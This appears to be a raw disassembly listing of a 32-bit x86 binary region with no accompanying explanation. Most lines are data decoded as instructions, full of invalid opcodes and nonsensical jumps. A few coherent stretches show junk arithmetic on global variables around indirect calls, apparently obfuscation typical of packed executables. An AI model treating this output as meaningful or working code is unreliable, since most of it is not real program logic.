  41e75f:	xchg   edx,edx
  41e761:	ret    0xea80
  41e764:	fcmove st,st(7)
  41e766:	(bad)  
  41e768:	mov    bl,0xc9
  41e76a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e76b:	inc    ebx
  41e76c:	or     esp,0x2b9d996
  41e772:	jle    0x41e7ec
  41e774:	int    0x68
  41e776:	xchg   BYTE PTR [eax-0x78],bl
  41e779:	pop    edi
  41e77a:	pop    ds
  41e77b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e77c:	adc    eax,DWORD PTR [eax-0x68]
  41e77f:	mov    edi,0x6155fa41
  41e784:	sbb    al,0x72
  41e786:	in     al,0x39
  41e788:	sub    DWORD PTR [edx],eax
  41e78a:	pop    ecx
  41e78b:	mov    dl,0x2
  41e78d:	and    BYTE PTR [eax+0x3dd52677],ah
  41e793:	cmp    BYTE PTR [eax-0x1d5f8e9c],bl
  41e799:	adc    eax,0x4feb257d
  41e79e:	push   ebx
  41e79f:	scas   al,BYTE PTR es:[edi]
  41e7a0:	fistp  QWORD PTR [ebx+0x6b2bf6ca]
  41e7a6:	loope  0x41e7ab
  41e7a8:	enter  0x89d5,0x21
  41e7ac:	mov    dl,0xce
  41e7ae:	mov    esi,DWORD PTR es:0x266c3062
  41e7b5:	mov    ah,0x4c
  41e7b7:	popa   
  41e7b8:	(bad)  
  41e7ba:	sub    DWORD PTR [ecx+edi*8-0x1f],ebp
  41e7be:	adc    eax,0x5e0d283e
  41e7c3:	dec    ecx
  41e7c4:	sub    edi,esp
  41e7c6:	cli    
  41e7c7:	shl    BYTE PTR [eax+0x5d471c7],1
  41e7cd:	into   
  41e7ce:	push   0x2b3321b6
  41e7d3:	push   ecx
  41e7d4:	pop    es
  41e7d5:	gs ret 
  41e7d7:	mov    ebp,0xb6f76814
  41e7dc:	stos   DWORD PTR es:[edi],eax
  41e7dd:	inc    esp
  41e7de:	xor    DWORD PTR [ecx],0x23
  41e7e1:	push   ds
  41e7e2:	xor    BYTE PTR [esi-0x4af2a9c2],ah
  41e7e8:	aam    0x91
  41e7ea:	jl     0x41e81f
  41e7ec:	out    dx,al
  41e7ed:	(bad)  
  41e7ee:	push   ss
  41e7ef:	dec    edi
  41e7f0:	add    al,dl
  41e7f2:	rcr    BYTE PTR [edx+0x2a],0x97
  41e7f6:	cmc    
  41e7f7:	mov    bh,0x85
  41e7f9:	mov    edi,DWORD PTR [eax+edi*8+0x16]
  41e7fd:	sub    ecx,esp
  41e7ff:	sar    BYTE PTR [esi+0xc],cl
  41e802:	aaa    
  41e803:	xor    edx,edx
  41e805:	lods   al,BYTE PTR ds:[esi]
  41e806:	jl     0x41e84b
  41e808:	cld    
  41e809:	sbb    ch,BYTE PTR [edi-0x2e]
  41e80c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e80d:	xor    eax,0x8621d045
  41e812:	cli    
  41e813:	loopne 0x41e887
  41e815:	xor    BYTE PTR [edx-0x7607e28a],bl
  41e81b:	jmp    0x656a:0xd7d85ed5
  41e822:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e824:	inc    edi
  41e825:	test   DWORD PTR [ebp+0x4c7c4cd3],edi
  41e82b:	adc    BYTE PTR [eax],dh
  41e82d:	out    dx,eax
  41e82e:	and    ecx,ebx
  41e830:	add    eax,0x1f0469d9
  41e835:	pop    ebp
  41e836:	(bad)  
  41e837:	sbb    eax,0x8fe99e4f
  41e83c:	mov    dh,0x5
  41e83e:	mov    WORD PTR [ebp-0x1c7501d7],gs
  41e844:	aas    
  41e845:	push   cs
  41e846:	shl    BYTE PTR [eax+0xeee19ba],1
  41e84c:	ds in  al,dx
  41e84e:	ins    BYTE PTR es:[edi],dx
  41e84f:	jbe    0x41e8b7
  41e851:	fmul   st(7),st
  41e853:	mov    esi,0xf172685
  41e858:	pop    esp
  41e859:	jnp    0x41e800
  41e85b:	frstor [eax]
  41e85d:	or     cl,BYTE PTR ss:[ebp+0x7bb4d36e]
  41e864:	jle    0x41e833
  41e866:	push   eax
  41e867:	test   BYTE PTR [ebx],cl
  41e869:	in     al,dx
  41e86a:	aad    0x1e
  41e86c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e86d:	icebp  
  41e86e:	push   ss
  41e86f:	xchg   ebp,eax
  41e870:	push   ds
  41e871:	mov    ds:0x9f27aaf2,al
  41e876:	add    bl,dl
  41e878:	(bad)  
  41e879:	fcom   DWORD PTR [ebp+ecx*4-0x5c60cd79]
  41e880:	outs   dx,DWORD PTR ds:[esi]
  41e881:	dec    ecx
  41e882:	inc    ebx
  41e883:	xchg   esp,eax
  41e884:	sbb    al,0x2b
  41e886:	pusha  
  41e887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e888:	adc    al,0x7b
  41e88a:	pop    ebx
  41e88b:	mov    eax,0xece3767d
  41e890:	out    dx,al
  41e891:	aas    
  41e892:	aaa    
  41e893:	jne    0x41e8d5
  41e895:	popf   
  41e896:	xchg   esi,eax
  41e897:	iret   
  41e898:	and    ch,bl
  41e89a:	(bad)  
  41e89b:	push   edx
  41e89c:	jg     0x41e8be
  41e89e:	es loope 0x41e870
  41e8a1:	pusha  
  41e8a2:	mov    edx,0x785b8741
  41e8a8:	bound  edx,QWORD PTR [ecx-0x42]
  41e8ab:	mov    ah,0xd0
  41e8ad:	fcmovnu st,st(6)
  41e8af:	scas   al,BYTE PTR es:[edi]
  41e8b0:	ror    esi,cl
  41e8b2:	sbb    ebx,DWORD PTR [esi]
  41e8b4:	dec    bh
  41e8b6:	inc    ebx
  41e8b7:	stos   BYTE PTR es:[edi],al
  41e8b8:	stos   DWORD PTR es:[edi],eax
  41e8b9:	ret    0xeba9
  41e8bc:	(bad)  
  41e8bd:	jne    0x41e8e5
  41e8bf:	aad    0xf7
  41e8c1:	mov    WORD PTR [eax],ds
  41e8c3:	jns    0x41e918
  41e8c5:	mov    dh,0xf4
  41e8c7:	imul   esi,DWORD PTR [edx+0x1f520719],0xe
  41e8ce:	aaa    
  41e8cf:	jae    0x41e944
  41e8d1:	das    
  41e8d2:	imul   ebp,esi,0xbe715b62
  41e8d8:	retf   
  41e8d9:	xchg   edi,eax
  41e8da:	fisttp QWORD PTR [ecx+0x1f58654e]
  41e8e0:	out    0x1f,al
  41e8e2:	sti    
  41e8e3:	idiv   BYTE PTR [esi-0x11]
  41e8e6:	add    eax,0x1a2cd1e8
  41e8eb:	stos   BYTE PTR es:[edi],al
  41e8ec:	push   esi
  41e8ed:	in     al,0x35
  41e8ef:	(bad)  
  41e8f0:	fistp  WORD PTR [edi]
  41e8f2:	and    al,0x3
  41e8f4:	leave  
  41e8f5:	call   0xf1e5:0xa51568cc
  41e8fc:	mov    al,0xe2
  41e8fe:	fsubr  DWORD PTR [esi-0x13]
  41e901:	xor    ch,bl
  41e903:	in     eax,dx
  41e904:	pop    ds
  41e905:	push   es
  41e906:	and    al,0x9c
  41e908:	scas   eax,DWORD PTR es:[edi]
  41e909:	lock loop 0x41e8a9
  41e90c:	int3   
  41e90d:	in     al,0xdc
  41e90f:	and    eax,0xb717faad
  41e914:	mov    ecx,0x2275a146
  41e919:	aad    0x38
  41e91b:	pop    eax
  41e91c:	mov    edx,0x5eb940af
  41e921:	mov    al,0x24
  41e923:	fdivp  st(0),st
  41e925:	sub    DWORD PTR [ebp-0xaff7f1f],ebp
  41e92b:	mov    eax,0xd29e6cab
  41e930:	in     al,0x71
  41e932:	push   es
  41e933:	mov    cl,0xe2
  41e935:	xor    dh,ch
  41e937:	int3   
  41e938:	sahf   
  41e939:	lock in eax,0xb3
  41e93c:	add    bh,bl
  41e93e:	dec    edi
  41e93f:	or     BYTE PTR [ecx+0x7ad42cbb],cl
  41e945:	mov    edi,es
  41e947:	sub    al,BYTE PTR [ebx]
  41e949:	jp     0x41e8ec
  41e94b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e94c:	or     al,0xe1
  41e94e:	iret   
  41e94f:	sbb    bh,dl
  41e951:	xor    bl,BYTE PTR [ebx-0x7b]
  41e954:	xor    BYTE PTR [esi-0xbd90370],bh
  41e95a:	inc    edi
  41e95b:	xor    esi,ecx
  41e95d:	mov    esi,DWORD PTR es:[esi+0xa]
  41e961:	scas   al,BYTE PTR es:[edi]
  41e962:	jmp    0x9802:0x70e1553b
  41e969:	sub    bl,0x3e
  41e96c:	(bad)  
  41e96d:	sbb    al,0x9e
  41e96f:	dec    esp
  41e970:	jle    0x41e967
  41e972:	mov    esp,0x6591be47
  41e977:	adc    BYTE PTR [ebp-0x44],0x76
  41e97b:	dec    BYTE PTR [edx]
  41e97d:	mov    eax,0x724c0a7c
  41e982:	push   ss
  41e983:	or     edx,edi
  41e985:	mov    ecx,edx
  41e987:	mov    edx,DWORD PTR [esp+0x18]
  41e98b:	xor    eax,ebx
  41e98d:	xor    ecx,esi
  41e98f:	mov    esi,DWORD PTR [esp+0x1c]
  41e993:	cmp    edx,eax
  41e995:	jne    0x41e9a3
  41e99b:	cmp    esi,ecx
  41e99d:	je     0x41e9ea
  41e9a3:	push   DWORD PTR ds:0x422688
  41e9a9:	push   DWORD PTR ds:0x42241c
  41e9af:	mov    eax,ds:0x422598
  41e9b4:	mov    eax,DWORD PTR [eax+0x1a4]
  41e9ba:	push   DWORD PTR [eax]
  41e9bc:	mov    eax,DWORD PTR [esp+0x78]
  41e9c0:	call   eax
  41e9c2:	mov    ecx,DWORD PTR ds:0x422598
  41e9c8:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41e9ce:	mov    DWORD PTR [ecx],eax
  41e9d0:	mov    eax,ds:0x422598
  41e9d5:	push   0x4
  41e9d7:	add    eax,0x1dc
  41e9dc:	push   eax
  41e9dd:	lea    eax,[esp+0x84]
  41e9e4:	push   eax
  41e9e5:	call   0x415231
  41e9ea:	mov    eax,DWORD PTR [esp+0x7c]
  41e9ee:	mov    eax,DWORD PTR [eax]
  41e9f0:	pop    edi
  41e9f1:	pop    esi
  41e9f2:	pop    ebx
  41e9f3:	mov    esp,ebp
  41e9f5:	pop    ebp
  41e9f6:	ret    0xc
  41e9f9:	push   ebp
  41e9fa:	mov    ebp,esp
  41e9fc:	sub    esp,0x23c
  41ea02:	or     ecx,eax
  41ea04:	push   ebx
  41ea05:	cmp    DWORD PTR ds:0x4282a7,0x0
  41ea0c:	mov    DWORD PTR ds:0x4283b3,0x7749
  41ea16:	mov    DWORD PTR ds:0x4281b3,ebx
  41ea1c:	mov    DWORD PTR ds:0x428353,edx
  41ea22:	mov    DWORD PTR ds:0x428353,0xc7b
  41ea2c:	jmp    0x41ea8e
  41ea31:	mov    DWORD PTR ds:0x4282cb,edx
  41ea37:	cmp    DWORD PTR ds:0x4282a7,0x0
  41ea3e:	jg     0x41ea74
  41ea44:	push   0x2154
  41ea49:	push   0x5063
  41ea4e:	call   DWORD PTR ds:0x428e54
  41ea54:	sbb    DWORD PTR ds:0x4283af,ecx
  41ea5a:	mov    ecx,DWORD PTR ds:0x42835b
  41ea60:	xor    ecx,DWORD PTR ds:0x428347
  41ea66:	mov    DWORD PTR ds:0x42835b,ecx
  41ea6c:	sbb    ecx,0x6e15
  41ea72:	neg    ecx
  41ea74:	xor    DWORD PTR ds:0x428283,ecx
  41ea7a:	adc    ecx,DWORD PTR ds:0x4281d7
  41ea80:	mov    ecx,DWORD PTR ds:0x428223
  41ea86:	mov    ecx,DWORD PTR [ecx]
  41ea88:	and    DWORD PTR ds:0x4281c7,ecx
  41ea8e:	push   esi
  41ea8f:	mov    ecx,DWORD PTR ds:0x428237
  41ea95:	mov    eax,ds:0x428323
  41ea9a:	sub    eax,ecx
  41ea9c:	imul   ecx,DWORD PTR [ecx+eax*1]
  41eaa0:	push   edi
  41eaa1:	add    DWORD PTR ds:0x42829b,ebx
  41eaa7:	mov    DWORD PTR [ebp-0x50],0x1
  41eaae:	sub    DWORD PTR ds:0x4282cb,edi
  41eab4:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41eabe:	xor    DWORD PTR ds:0x42835b,0x437e
  41eac8:	mov    DWORD PTR [ebp-0xb8],0x1
  41ead2:	mov    ecx,DWORD PTR [ebp-0xb8]
  41ead8:	add    eax,0x2e28
  41eadd:	mov    eax,0x584
  41eae2:	xor    edx,edx
  41eae4:	sbb    DWORD PTR ds:0x4283d7,0x42832f
  41eaee:	div    ecx
  41eaf0:	xor    ecx,0x2352
  41eaf6:	imul   eax,eax,0x51d4
  41eafc:	neg    ecx
  41eafe:	mov    ecx,DWORD PTR [ebp-0xbc]
  41eb04:	or     DWORD PTR ds:0x4283c3,0x4283d3
  41eb0e:	xor    eax,ecx
  41eb10:	and    eax,0x4c09
  41eb15:	xor    ecx,DWORD PTR ds:0x428343
  41eb1b:	mov    ecx,DWORD PTR [ebp-0x50]
  41eb1e:	xor    edx,edx
  41eb20:	and    DWORD PTR ds:0x42829b,0x4281cf
  41eb2a:	div    ecx
  41eb2c:	or     DWORD PTR ds:0x4283e7,0x3423
  41eb36:	sub    eax,0x401
  41eb3b:	cmp    DWORD PTR ds:0x428367,0x0
  41eb42:	mov    DWORD PTR ds:0x4283d7,edx
  41eb48:	mov    DWORD PTR ds:0x428277,ebx
  41eb4e:	not    DWORD PTR ds:0x428273
  41eb54:	jmp    0x41ebb2
  41eb59:	mov    DWORD PTR ds:0x42826b,0x3ca0
  41eb63:	not    DWORD PTR ds:0x428357
  41eb69:	cmp    DWORD PTR ds:0x428367,0x0
  41eb70:	je     0x41eba0
  41eb76:	push   DWORD PTR [ebp-0x10]
  41eb79:	push   0x4da1
  41eb7e:	push   0x1144
  41eb83:	push   DWORD PTR [ebp-0x18]
  41eb86:	call   DWORD PTR ds:0x428e58
  41eb8c:	add    edx,0x1800
  41eb92:	add    edx,DWORD PTR ds:0x4283cf
  41eb98:	sub    ecx,ecx
  41eb9a:	adc    ecx,0x47f1
  41eba0:	sub    edx,edx
  41eba2:	mov    DWORD PTR ds:0x4283d7,0x44a4
  41ebac:	and    ecx,DWORD PTR ds:0x42826f
  41ebb2:	mov    DWORD PTR [ebp-0x90],eax
  41ebb8:	mov    eax,ds:0x428303
  41ebbd:	mov    eax,DWORD PTR [eax]
  41ebbf:	sbb    DWORD PTR ds:0x4283d3,eax
  41ebc5:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41ebcf:	add    DWORD PTR ds:0x42819b,0x4282e7
  41ebd9:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41ebe0:	xor    DWORD PTR ds:0x42828f,edx
  41ebe6:	mov    DWORD PTR [ebp-0xb4],0x3842
  41ebf0:	or     edx,ecx
  41ebf2:	jmp    0x41ef4e
  41ebf7:	ret    0x8bf6
  41ebfa:	push   ebx
  41ebfb:	sbb    ch,BYTE PTR [ebx]
  41ebfd:	mov    edx,0x71125f66
  41ec02:	mov    al,0xe4
  41ec04:	bnd ja 0x41ec83
  41ec07:	push   cs
  41ec08:	das    
  41ec09:	push   ss
  41ec0a:	sbb    BYTE PTR [ebx-0x71e7e7ee],ah
  41ec10:	js     0x41eba7
  41ec12:	faddp  st(5),st
  41ec14:	xchg   esi,eax
  41ec15:	adc    eax,0xc4aab94
  41ec1a:	shl    esi,0x74
  41ec1d:	xor    eax,0x8af2a134
  41ec22:	je     0x41eba9
  41ec24:	scas   al,BYTE PTR es:[edi]
  41ec25:	loopne 0x41ec7b
  41ec27:	lahf   
  41ec28:	nop
  41ec29:	dec    eax
  41ec2a:	inc    ebx
  41ec2b:	test   al,0x51
  41ec2d:	mov    eax,0x748708c1
  41ec32:	pop    ds
  41ec33:	pop    ecx
  41ec34:	lahf   
  41ec35:	sub    eax,eax
  41ec37:	sbb    eax,0xb09f6bb2
  41ec3c:	mov    bh,0x94
  41ec3e:	outs   dx,BYTE PTR ds:[esi]
  41ec3f:	sbb    ebp,ebx
  41ec41:	jecxz  0x41ec11
  41ec43:	pop    eax
  41ec44:	jb     0x41ec40
  41ec46:	jl     0x41ec5d
  41ec48:	push   ebp
  41ec49:	push   ebp
  41ec4a:	test   eax,0x44d4dde9
  41ec4f:	and    al,BYTE PTR [eax+0x7]
  41ec52:	in     al,0xda
  41ec54:	cs push edi
  41ec56:	cmp    esp,0xffffffbe
  41ec59:	(bad)  
  41ec5a:	in     eax,dx
  41ec5b:	jo     0x41ec57
  41ec5d:	add    bl,bh
  41ec5f:	push   edx
  41ec60:	push   ebx
  41ec61:	pop    eax
  41ec62:	retf   0xbcfa
  41ec65:	shl    BYTE PTR [ebp+0x3ec44e33],0x43
  41ec6c:	sub    DWORD PTR [ebp+0x33f42926],esp
  41ec72:	in     eax,dx
  41ec73:	xchg   edi,eax
  41ec74:	(bad)  
  41ec75:	out    dx,al
  41ec76:	add    esi,DWORD PTR [edx]
  41ec78:	dec    ebx
  41ec79:	test   BYTE PTR ds:0x5e6965ec,cl
  41ec7f:	test   al,0xef
  41ec81:	icebp  
  41ec82:	addr16 mov ebp,0x59475a85
  41ec88:	jmp    0xcf8fbc4f
  41ec8d:	push   eax
  41ec8e:	jbe    0x41ec4d
  41ec90:	outs   dx,BYTE PTR es:[esi]
  41ec92:	nop
  41ec93:	test   eax,0x558660a1
  41ec98:	dec    ebp
  41ec99:	ret    0x6344
  41ec9c:	push   ebx
  41ec9d:	fwait
  41ec9e:	adc    esi,DWORD PTR [eax-0x3a]
  41eca1:	jne    0x41eca5
  41eca3:	dec    esi
  41eca4:	mov    ds:0xbca74436,eax
  41eca9:	je     0x41ece7
  41ecab:	dec    ebp
  41ecac:	and    eax,0xf60a0499
  41ecb1:	jle    0x41ec98
  41ecb3:	dec    edi
  41ecb4:	arpl   WORD PTR [esi],cx
  41ecb6:	ret    
  41ecb7:	inc    edi
  41ecb8:	mov    ds:0x539f93b6,al
  41ecbd:	push   eax
  41ecbe:	inc    edx
  41ecbf:	xor    al,0xcd
  41ecc1:	inc    edi
  41ecc2:	pusha  
  41ecc3:	add    BYTE PTR [ebx],al
  41ecc5:	adc    cl,BYTE PTR [ebx+0x7fcd4e85]
  41eccb:	mov    eax,DWORD PTR [esi-0x51]
  41ecce:	dec    edi
  41eccf:	sahf   
  41ecd0:	adc    al,0x61
  41ecd2:	test   eax,0x16be3cfd
  41ecd7:	xlat   BYTE PTR ds:[ebx]
  41ecd8:	mov    ebx,0x64014085
  41ecdd:	fdivr  QWORD PTR [edx]
  41ecdf:	cwde   
  41ece0:	and    al,0xca
  41ece2:	jns    0x41ec68
  41ece4:	sub    al,0xbd
  41ece6:	add    DWORD PTR [edx],ecx
  41ece8:	adc    al,0x1d
  41ecea:	out    dx,eax
  41eceb:	and    DWORD PTR [esi-0x457a8c02],esp
  41ecf1:	mov    dh,0xca
  41ecf3:	inc    ebx
  41ecf4:	scas   al,BYTE PTR es:[edi]
  41ecf5:	hlt    
  41ecf6:	rcl    al,cl
  41ecf8:	neg    dx
  41ecfb:	adc    cl,cl
  41ecfd:	bound  ebp,QWORD PTR [esi+0x7b3a47b9]
  41ed03:	dec    ecx
  41ed04:	adc    al,0xa6
  41ed06:	hlt    
  41ed07:	(bad)  
  41ed08:	iret   
  41ed09:	inc    ecx
  41ed0a:	or     dl,BYTE PTR [esi]
  41ed0c:	sbb    DWORD PTR [eax],0x4fe8523
  41ed12:	and    ah,BYTE PTR [eax+0x7f74c17]
  41ed18:	push   esp
  41ed19:	fldenv [esi]
  41ed1b:	es push ebp
  41ed1d:	in     eax,dx
  41ed1e:	cwde   
  41ed1f:	push   ebp
  41ed20:	jnp    0x41ed11
  41ed22:	add    eax,0xf131f230
  41ed27:	sub    DWORD PTR [edi-0x7f159943],edx
  41ed2d:	(bad)  
  41ed2e:	pop    ebp
  41ed2f:	in     al,0x17
  41ed31:	hlt    
  41ed32:	push   cs
  41ed33:	pop    ds
  41ed34:	mov    ecx,0xb9f4e039
  41ed39:	aad    0xa0
  41ed3b:	call   0xdf78:0x1d495321
  41ed42:	inc    ebx
  41ed43:	sub    edx,ebp
  41ed45:	pusha  
  41ed46:	mov    BYTE PTR cs:[eax],0x91
  41ed4a:	xor    BYTE PTR [eax-0x1f],0xff
  41ed4e:	iret   
  41ed4f:	push   es
  41ed50:	retf   
  41ed51:	lods   eax,DWORD PTR ds:[esi]
  41ed52:	jmp    0x41ed9a
  41ed54:	imul   ebx,esp,0x54a7ddf0
  41ed5a:	int    0x6
  41ed5c:	push   0x7
  41ed5e:	es mov ch,0x98
  41ed61:	ficom  DWORD PTR [eax]
  41ed63:	retf   0xe98a
  41ed66:	mov    ds:0x62128efb,al
  41ed6b:	dec    eax
  41ed6c:	repnz sbb ebp,DWORD PTR [ebp+0x42]
  41ed70:	mov    ah,0xd6
  41ed72:	call   0xb7d859c8
  41ed77:	or     ah,BYTE PTR [ebp-0x72ae004d]
  41ed7d:	scas   eax,DWORD PTR es:[edi]
  41ed7e:	push   ds
  41ed7f:	test   eax,edx
  41ed81:	inc    esi
  41ed82:	aad    0x3b
  41ed84:	xlat   BYTE PTR ds:[ebx]
  41ed85:	hlt    
  41ed86:	test   BYTE PTR [ebx+0x68],dl
  41ed89:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41ed8b:	retf   
  41ed8c:	mov    ah,0xe7
  41ed8e:	test   DWORD PTR [eax+0x1d5a7b7],edx
  41ed94:	ucomiss xmm2,DWORD PTR [esi+0x5311c1e3]
  41ed9b:	add    BYTE PTR [edx],0xc2
  41ed9e:	imul   esi,DWORD PTR [edx],0x66
  41eda1:	xchg   edx,eax
  41eda2:	outs   dx,DWORD PTR ds:[esi]
  41eda3:	jl     0x41ed66
  41eda5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eda6:	out    0xf0,al
  41eda8:	xor    eax,0xc4fe9f78
  41edad:	pop    ss
  41edae:	add    eax,0x6c
  41edb1:	mov    cl,0xd4
  41edb3:	pop    edx
  41edb4:	push   ebx
  41edb5:	inc    edx
  41edb6:	mov    ebp,0xfef855e7
  41edbb:	push   eax
  41edbc:	add    al,0xc2
  41edbe:	mov    esp,0x21692cd2
  41edc3:	or     BYTE PTR [esp+edx*2],bh
  41edc6:	das    
  41edc7:	jbe    0x41eded
  41edc9:	inc    ecx
  41edca:	cmp    BYTE PTR [edi-0x46baf9cb],al
  41edd0:	jmp    0xe31a7260
  41edd5:	inc    ebp
  41edd6:	or     DWORD PTR [eax-0x2ebc8875],0xfffffff2
  41eddd:	inc    esp
  41edde:	pop    edx
  41eddf:	jg     0x41ee28
  41ede1:	cmp    ebp,0xc4ae4d0b
  41ede7:	and    al,bh
  41ede9:	leave  
  41edea:	cdq    
  41edeb:	sbb    edx,DWORD PTR [edx]
  41eded:	push   esi
  41edee:	fimul  WORD PTR ds:0x88db10e5
  41edf4:	sbb    DWORD PTR [edx],esi
  41edf6:	call   0x4634:0x798510fb
  41edfd:	jmp    0x501fc885
  41ee02:	aam    0xec
  41ee04:	sar    BYTE PTR [ecx-0x1c77cfaa],0x69
  41ee0b:	add    DWORD PTR [edi],eax
  41ee0d:	js     0x41ee05
  41ee0f:	imul   esp,DWORD PTR [eax-0x7d],0xffffff9f
  41ee13:	(bad)  
  41ee15:	in     al,0x10
  41ee17:	xchg   ebx,eax
  41ee18:	xchg   esi,eax
  41ee19:	aas    
  41ee1a:	mov    dh,bh
  41ee1c:	addr16 fs jge 0x41ee32
  41ee20:	jmp    0x41ee98
  41ee22:	(bad)  
  41ee23:	mov    BYTE PTR [esi],ah
  41ee25:	std    
  41ee26:	call   0xea8e:0xb3bc807d
  41ee2d:	fcomp  QWORD PTR [ebx+edi*8]
  41ee30:	outs   dx,BYTE PTR ds:[esi]
  41ee31:	jmp    0x41ee1e
  41ee33:	add    esi,DWORD PTR [ecx]
  41ee35:	nop
  41ee36:	sbb    ebx,DWORD PTR [esi+0x2ca64713]
  41ee3c:	pop    es
  41ee3d:	cmp    DWORD PTR [edx],edx
  41ee3f:	clc    
  41ee40:	aad    0x3e
  41ee42:	ds mov ch,0xcf
  41ee45:	mov    al,0x64
  41ee47:	inc    edi
  41ee48:	scas   eax,DWORD PTR es:[edi]
  41ee49:	ins    DWORD PTR es:[edi],dx
  41ee4a:	mov    cl,0xb7
  41ee4c:	ins    DWORD PTR es:[edi],dx
  41ee4d:	push   cs
  41ee4e:	adc    eax,DWORD PTR [ecx-0x655f1a0d]
  41ee54:	pop    edi
  41ee55:	cld    
  41ee56:	ins    DWORD PTR es:[edi],dx
  41ee57:	aas    
  41ee58:	data16 fcomp QWORD PTR [edx+0x70]
  41ee5c:	xchg   esp,eax
  41ee5d:	fbstp  TBYTE PTR [edx+0x53519c4e]
  41ee63:	xor    bh,BYTE PTR [ebp+0x4a97fa2e]
  41ee69:	add    al,ch
  41ee6b:	jge    0x41ee72
  41ee6d:	sub    BYTE PTR [edx],cl
  41ee6f:	mov    al,ds:0x76b8eb96
  41ee74:	xchg   esi,eax
  41ee75:	sbb    BYTE PTR [eax+0x44299a79],ah
  41ee7b:	jno    0x41ee31
  41ee7d:	inc    edx
  41ee7e:	imul   DWORD PTR [ebx]
  41ee80:	test   eax,0xc27002d3
  41ee85:	scas   al,BYTE PTR es:[edi]
  41ee86:	fcom   QWORD PTR [edi-0x5d]
  41ee89:	xor    bh,al
  41ee8b:	mov    dl,0x2d
  41ee8d:	aad    0xb0
  41ee8f:	in     al,0x84
  41ee91:	lock ret 
  41ee93:	push   ecx
  41ee94:	jecxz  0x41ee5a
  41ee96:	and    BYTE PTR [ebx-0x52230bd7],ah
  41ee9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee9d:	push   ss
  41ee9e:	and    eax,0xf510cdb9
  41eea3:	mov    esp,0x98fd4ac4
  41eea8:	ds arpl bx,sp
  41eeab:	bound  ebp,QWORD PTR [ebx-0x5227af57]
  41eeb1:	pop    esi
  41eeb2:	int3   
  41eeb3:	dec    esi
  41eeb4:	cmc    
  41eeb5:	pop    ds
  41eeb6:	dec    esi
  41eeb7:	add    eax,0xd27329e2
  41eebc:	or     al,0x9c
  41eebe:	fistp  QWORD PTR [esi]
  41eec0:	pop    esp
  41eec1:	xor    al,al
  41eec3:	icebp  
  41eec4:	xor    eax,0x8e75e926
  41eec9:	push   edx
  41eeca:	jg     0x41ee80
  41eecc:	std    
  41eecd:	adc    DWORD PTR [ecx-0x40],0xffffffbc
  41eed1:	xchg   edx,eax
  41eed2:	lds    edi,FWORD PTR [eax+ecx*2+0x60]
  41eed6:	inc    ebx
  41eed7:	mov    edi,0x1d644d55
  41eedc:	pushf  
  41eedd:	sub    BYTE PTR [ebp-0x5e],dl
  41eee0:	mov    eax,0x442e7814
  41eee5:	ja     0x41ee8d
  41eee7:	in     al,0x23
  41eee9:	nop
  41eeea:	mov    al,ds:0xd7538af0
  41eeef:	rcr    BYTE PTR [ebx+0xf],0x8d
  41eef3:	pop    ds
  41eef4:	mov    ch,0xd0
  41eef6:	sbb    eax,0x7dee70b
  41eefb:	fwait
  41eefc:	sar    DWORD PTR [ebx+0x6d],cl
  41eeff:	dec    edi
  41ef00:	iret   
  41ef01:	not    bl
  41ef03:	adc    al,0xd9
  41ef05:	cs enter 0x8eab,0x35
  41ef0a:	(bad)
  41ef0e:	jl     0x41ef60
  41ef10:	imul   ebx,DWORD PTR [edx-0x36],0x751ca8db
  41ef17:	jns    0x41ef1a
  41ef19:	jne    0x41ef8a
  41ef1b:	push   cs
  41ef1c:	imul   eax,DWORD PTR [eax+0x4ee7d75f],0xffffffa1
  41ef23:	and    al,0xc0
  41ef25:	aas    
  41ef26:	jne    0x41ef5e
  41ef28:	or     BYTE PTR [esi+0x7a],dl
  41ef2b:	loop   0x41ef7f
  41ef2d:	bound  ecx,QWORD PTR [esp+eiz*4-0x547a40db]
  41ef34:	retf   
  41ef35:	stos   DWORD PTR es:[edi],eax
  41ef36:	mov    al,ds:0x263cc139
  41ef3b:	or     BYTE PTR [edx+0x76],al
  41ef3e:	lods   eax,DWORD PTR ds:[esi]
  41ef3f:	ja     0x41eedd
  41ef41:	int3   
  41ef42:	scas   eax,DWORD PTR es:[edi]
  41ef43:	fld    DWORD PTR [edx+0x19]
  41ef46:	(bad)  
  41ef47:	out    0xff,eax
  41ef49:	imul   edx,DWORD PTR [ecx-0x74712539],0x45
  41ef50:	mov    ah,0x81
  41ef52:	adc    eax,0x4281af
  41ef57:	xchg   ebx,eax
  41ef58:	xor    al,0x0
  41ef5a:	add    BYTE PTR [ebx],al
  41ef5c:	test   DWORD PTR [edi+edi*8-0x1],ecx
  41ef60:	inc    DWORD PTR [ecx+0x29cf2]
  41ef66:	add    BYTE PTR ds:0x2e02,dh
  41ef6c:	sbb    ecx,ecx
  41ef6e:	xor    eax,0x7294
  41ef73:	movzx  edx,WORD PTR ds:0x4282d3
  41ef7a:	sbb    DWORD PTR ds:0x4281af,edx
  41ef80:	imul   eax,eax,0x68f3
  41ef86:	and    DWORD PTR ds:0x4281c7,edi
  41ef8c:	mov    ecx,DWORD PTR [ebp-0x8c]
  41ef92:	cmp    DWORD PTR ds:0x42833b,0x0
  41ef99:	mov    edx,0x254
  41ef9e:	mov    edx,0x254c
  41efa3:	mov    edx,0x6b4f
  41efa8:	jmp    0x41f000
  41efad:	mov    DWORD PTR ds:0x42832b,0x78fa
  41efb7:	cmp    DWORD PTR ds:0x42833b,0x0
  41efbe:	jb     0x41efe4
  41efc4:	push   DWORD PTR [ebp-0x1c]
  41efc7:	push   0x74cd
  41efcc:	push   0x4a2f
  41efd1:	call   DWORD PTR ds:0x428e5c
  41efd7:	sub    edx,DWORD PTR ds:0x42826f
  41efdd:	inc    edx
  41efde:	and    edx,DWORD PTR ds:0x42828b
  41efe4:	mov    DWORD PTR ds:0x4283d3,0x703b
